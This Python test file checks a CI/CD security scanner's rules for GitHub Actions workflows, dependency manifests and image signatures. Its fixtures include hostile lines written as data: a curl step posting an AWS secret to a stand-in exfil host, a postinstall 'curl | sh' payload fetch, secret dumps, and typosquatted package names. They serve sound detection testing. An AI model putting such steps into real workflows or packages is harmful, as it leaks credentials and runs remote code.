"""Unit tests for all static detection rules.

Covers:
- workflow_rules: PPE-001, INJ-001, PERM-001/002/003, ENV-001, SEC-001/002/003/004, PIN-001, REPO-001
- dependency_rules: DEP-001, DEP-002, DEP-003, DEP-004
- image_rules: IMG-001, IMG-002, IMG-003
- secrets_scan: GitleaksUnavailable (no binary present in test env)
"""

import pytest

from detection.alerts import PermanentError
from detection.static.dependency_rules import scan_manifest, scan_package_json, scan_requirements
from detection.static.image_rules import scan_image
from detection.static.secrets_scan import GitleaksUnavailable, scan_secrets
from detection.static.workflow_rules import WorkflowParseError, scan_workflow


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _rules(findings):
    return {f.rule_id for f in findings}


def _severities(findings):
    return {f.rule_id: f.severity for f in findings}


# ---------------------------------------------------------------------------
# Workflow rules
# ---------------------------------------------------------------------------

BENIGN_WORKFLOW = """\
name: CI
on:
  push:
    branches: [main]
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
      - name: Run tests
        run: python -m pytest
"""

PPE_WORKFLOW = """\
name: PR Build
on:
  pull_request_target:
    types: [opened, synchronize]
permissions: write-all
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - name: Greet
        run: echo "Building ${{ github.event.pull_request.title }}"
"""


class TestWorkflowRules:

    def test_benign_no_critical_findings(self):
        findings = scan_workflow(BENIGN_WORKFLOW)
        # Benign workflow may get PIN-001 for actions/checkout@SHA (it IS sha-pinned, so no finding)
        # and PERM-003 because permissions are declared. Check no critical/high rules fire.
        critical_high = [f for f in findings if f.severity in ("critical", "high")]
        assert not critical_high, [f.rule_id for f in critical_high]

    def test_ppe_001_pull_request_target_checkout(self):
        findings = scan_workflow(PPE_WORKFLOW)
        assert "PPE-001" in _rules(findings)
        ppe = next(f for f in findings if f.rule_id == "PPE-001")
        assert ppe.severity == "critical"
        assert "pull_request_target" in ppe.evidence.get("triggers", [])

    def test_inj_001_untrusted_input_in_run(self):
        findings = scan_workflow(PPE_WORKFLOW)
        assert "INJ-001" in _rules(findings)

    def test_perm_001_write_all(self):
        findings = scan_workflow(PPE_WORKFLOW)
        assert "PERM-001" in _rules(findings)
        perm = next(f for f in findings if f.rule_id == "PERM-001")
        assert perm.severity == "high"

    def test_perm_003_no_permissions_declared(self):
        workflow = """\
name: CI
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: echo hello
"""
        findings = scan_workflow(workflow)
        assert "PERM-003" in _rules(findings)

    def test_pin_001_unpinned_action(self):
        workflow = """\
name: CI
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: echo hello
"""
        findings = scan_workflow(workflow)
        assert "PIN-001" in _rules(findings)

    def test_pin_001_not_fired_for_sha_pinned(self):
        findings = scan_workflow(BENIGN_WORKFLOW)
        assert "PIN-001" not in _rules(findings)

    def test_sec_001_to_json_secrets(self):
        workflow = """\
name: CI
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: echo '${{ toJSON(secrets) }}' | base64
"""
        findings = scan_workflow(workflow)
        assert "SEC-001" in _rules(findings)
        sec = next(f for f in findings if f.rule_id == "SEC-001")
        assert sec.severity == "critical"

    def test_sec_002_secret_sent_to_external_host(self):
        workflow = """\
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Exfil
        env:
          AWS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
        run: curl -s https://collector.exfil.test/upload -d "$AWS_KEY"
"""
        findings = scan_workflow(workflow)
        assert "SEC-002" in _rules(findings)

    def test_sec_003_secret_printed_to_log(self):
        workflow = """\
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    env:
      TOKEN: ${{ secrets.NPM_TOKEN }}
    steps:
      - run: echo "token is $TOKEN"
"""
        findings = scan_workflow(workflow)
        assert "SEC-003" in _rules(findings)

    def test_env_001_secrets_in_workflow_env(self):
        workflow = """\
name: CI
on: push
env:
  DB_PASS: ${{ secrets.DB_PASSWORD }}
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: echo hello
"""
        findings = scan_workflow(workflow)
        assert "ENV-001" in _rules(findings)

    def test_repo_001_force_push(self):
        workflow = """\
name: CI
on: push
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - run: git push --force origin main
"""
        findings = scan_workflow(workflow)
        assert "REPO-001" in _rules(findings)

    def test_invalid_yaml_raises_permanent_error(self):
        with pytest.raises(WorkflowParseError, match="invalid YAML"):
            scan_workflow("key: [unclosed")

    def test_not_a_workflow_raises_permanent_error(self):
        with pytest.raises(WorkflowParseError, match="not a GitHub Actions workflow"):
            scan_workflow("name: Something\non: push\n")

    def test_empty_workflow_raises_permanent_error(self):
        with pytest.raises(WorkflowParseError):
            scan_workflow("")

    def test_non_mapping_yaml_raises_permanent_error(self):
        with pytest.raises(WorkflowParseError):
            scan_workflow("- item1\n- item2\n")

    def test_multiple_rules_on_same_workflow(self):
        """The full scenario-01 fixture should produce all five expected rules."""
        from pathlib import Path
        fixture = Path(__file__).parent.parent / "attack-lab/01-poisoned-pipeline/workflow.yml"
        content = fixture.read_text(encoding="utf-8")
        findings = scan_workflow(content)
        found = _rules(findings)
        assert "PPE-001" in found
        assert "INJ-001" in found
        assert "PERM-001" in found
        assert "SEC-003" in found
        assert "PIN-001" in found

    def test_perm_002_broad_write_permissions(self):
        workflow = """\
name: CI
on: push
permissions:
  contents: write
  issues: write
  pull-requests: write
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: echo hello
"""
        findings = scan_workflow(workflow)
        assert "PERM-002" in _rules(findings)

    def test_sec_004_env_dump_in_secret_job(self):
        workflow = """\
name: CI
on: push
jobs:
  debug:
    runs-on: ubuntu-latest
    env:
      TOKEN: ${{ secrets.TOKEN }}
    steps:
      - run: env
"""
        findings = scan_workflow(workflow)
        assert "SEC-004" in _rules(findings)


# ---------------------------------------------------------------------------
# Dependency rules
# ---------------------------------------------------------------------------

class TestDependencyRules:

    def test_dep_001_typosquat_pypi(self):
        content = "reqeusts==2.31.0\n"
        findings = scan_requirements(content, "requirements.txt")
        assert "DEP-001" in _rules(findings)
        dep = next(f for f in findings if f.rule_id == "DEP-001")
        assert dep.evidence["similar_to"] == "requests"
        assert dep.severity == "high"

    def test_dep_001_typosquat_npm(self):
        content = '{"dependencies": {"expresss": "^4.19.2"}}'
        findings = scan_package_json(content, "package.json")
        assert "DEP-001" in _rules(findings)
        dep = next(f for f in findings if f.rule_id == "DEP-001")
        assert dep.evidence["similar_to"] == "express"

    def test_dep_001_not_fired_for_legitimate_packages(self):
        content = "numpy==1.26.4\nflask==3.0.3\n"
        findings = scan_requirements(content, "requirements.txt")
        assert "DEP-001" not in _rules(findings)

    def test_dep_002_extra_index_url_http(self):
        content = "--extra-index-url http://pypi.internal.test/simple\nnumpy==1.26.4\n"
        findings = scan_requirements(content, "requirements.txt")
        assert "DEP-002" in _rules(findings)
        dep = next(f for f in findings if f.rule_id == "DEP-002")
        assert dep.severity == "high"

    def test_dep_002_index_url_https_is_med(self):
        content = "--index-url https://pypi.internal.test/simple\nnumpy==1.26.4\n"
        findings = scan_requirements(content, "requirements.txt")
        assert "DEP-002" in _rules(findings)
        dep = next(f for f in findings if f.rule_id == "DEP-002")
        assert dep.severity == "med"

    def test_dep_003_direct_url_requirement(self):
        content = "https://example.test/mypackage-1.0.tar.gz\n"
        findings = scan_requirements(content, "requirements.txt")
        assert "DEP-003" in _rules(findings)

    def test_dep_004_postinstall_script(self):
        content = '{"scripts": {"postinstall": "curl -s http://cdn.test/payload.sh | sh"}}'
        findings = scan_package_json(content, "package.json")
        assert "DEP-004" in _rules(findings)

    def test_dep_004_not_fired_for_safe_build_script(self):
        content = '{"scripts": {"build": "webpack --config webpack.config.js"}}'
        findings = scan_package_json(content, "package.json")
        assert "DEP-004" not in _rules(findings)

    def test_scenario_03_requirements_fixture(self):
        from pathlib import Path
        fixture = Path(__file__).parent.parent / "attack-lab/03-dependency-typosquat/requirements.txt"
        content = fixture.read_text(encoding="utf-8")
        findings = scan_requirements(content, "requirements.txt")
        found = _rules(findings)
        assert "DEP-001" in found  # reqeusts, colourama
        assert "DEP-002" in found  # --extra-index-url http://...

    def test_scenario_03_package_json_fixture(self):
        from pathlib import Path
        fixture = Path(__file__).parent.parent / "attack-lab/03-dependency-typosquat/package.json"
        content = fixture.read_text(encoding="utf-8")
        findings = scan_package_json(content, "package.json")
        found = _rules(findings)
        assert "DEP-001" in found  # expresss, axois
        assert "DEP-004" in found  # postinstall curl|sh

    def test_dep_001_not_fired_for_lodash(self):
        """lodash is a correct npm package name and must not be flagged."""
        content = '{"dependencies": {"lodash": "^4.17.21"}}'
        findings = scan_package_json(content, "package.json")
        assert "DEP-001" not in _rules(findings)

    def test_unsupported_manifest_raises(self):
        with pytest.raises(PermanentError, match="unsupported manifest"):
            scan_manifest("setup.py", "")

    def test_invalid_package_json_raises(self):
        with pytest.raises(PermanentError, match="invalid package.json"):
            scan_package_json("not json {{{", "package.json")

    def test_empty_requirements_no_findings(self):
        assert scan_requirements("# just a comment\n", "requirements.txt") == []

    def test_multiple_typosquats_detected(self):
        content = "reqeusts==2.31.0\ncolourama==0.4.6\n"
        findings = scan_requirements(content, "requirements.txt")
        dep001 = [f for f in findings if f.rule_id == "DEP-001"]
        assert len(dep001) == 2
        targets = {f.evidence["similar_to"] for f in dep001}
        assert targets == {"requests", "colorama"}


# ---------------------------------------------------------------------------
# Image rules
# ---------------------------------------------------------------------------

class TestImageRules:

    def test_img_001_no_signatures(self):
        findings = scan_image({"image": "ghcr.io/org/app:latest", "signatures": []})
        assert "IMG-001" in _rules(findings)
        img = next(f for f in findings if f.rule_id == "IMG-001")
        assert img.severity == "high"

    def test_img_003_mutable_tag_no_digest(self):
        findings = scan_image({"image": "ghcr.io/org/app:latest", "signatures": []})
        assert "IMG-003" in _rules(findings)

    def test_img_003_not_fired_when_digest_in_image_ref(self):
        findings = scan_image({
            "image": "ghcr.io/org/app@sha256:1111111111111111111111111111111111111111111111111111111111111111",
            "signatures": []
        })
        # IMG-001 still fires (no signatures) but IMG-003 should not
        assert "IMG-003" not in _rules(findings)

    def test_img_002_verification_failure(self):
        findings = scan_image({
            "image": "ghcr.io/org/api@sha256:1111111111111111111111111111111111111111111111111111111111111111",
            "digest": "sha256:1111111111111111111111111111111111111111111111111111111111111111",
            "signatures": [
                {"verified": False, "keyid": "k1", "subject_digest": "sha256:2222222222222222222222222222222222222222222222222222222222222222"}
            ]
        })
        assert "IMG-002" in _rules(findings)
        img = next(f for f in findings if f.rule_id == "IMG-002")
        assert img.severity == "critical"

    def test_img_no_finding_for_valid_signature(self):
        digest = "sha256:3333333333333333333333333333333333333333333333333333333333333333"
        findings = scan_image({
            "image": f"ghcr.io/org/worker@{digest}",
            "digest": digest,
            "signatures": [{"verified": True, "keyid": "k1", "subject_digest": digest}]
        })
        assert findings == []

    def test_scenario_04_unsigned_fixture(self):
        from pathlib import Path
        import json
        fixture = Path(__file__).parent.parent / "attack-lab/04-unsigned-image/unsigned.json"
        data = json.loads(fixture.read_text(encoding="utf-8"))
        findings = scan_image(data)
        found = _rules(findings)
        assert "IMG-001" in found
        assert "IMG-003" in found

    def test_scenario_04_tampered_fixture(self):
        from pathlib import Path
        import json
        fixture = Path(__file__).parent.parent / "attack-lab/04-unsigned-image/tampered.json"
        data = json.loads(fixture.read_text(encoding="utf-8"))
        findings = scan_image(data)
        assert "IMG-002" in _rules(findings)

    def test_scenario_04_signed_ok_no_findings(self):
        from pathlib import Path
        import json
        fixture = Path(__file__).parent.parent / "attack-lab/04-unsigned-image/signed-ok.json"
        data = json.loads(fixture.read_text(encoding="utf-8"))
        findings = scan_image(data)
        assert findings == []

    def test_img_missing_image_key_raises(self):
        with pytest.raises(KeyError):
            scan_image({"signatures": []})


# ---------------------------------------------------------------------------
# Secrets scan (unit — no gitleaks binary needed)
# ---------------------------------------------------------------------------

class TestSecretsScan:

    def test_gitleaks_unavailable_raises_permanent_error(self, tmp_path):
        """In the unit-test environment gitleaks is not on PATH; scan_secrets must raise GitleaksUnavailable."""
        import shutil
        if shutil.which("gitleaks"):
            pytest.skip("gitleaks is present — skipping unavailability test")
        with pytest.raises(GitleaksUnavailable):
            scan_secrets(tmp_path)
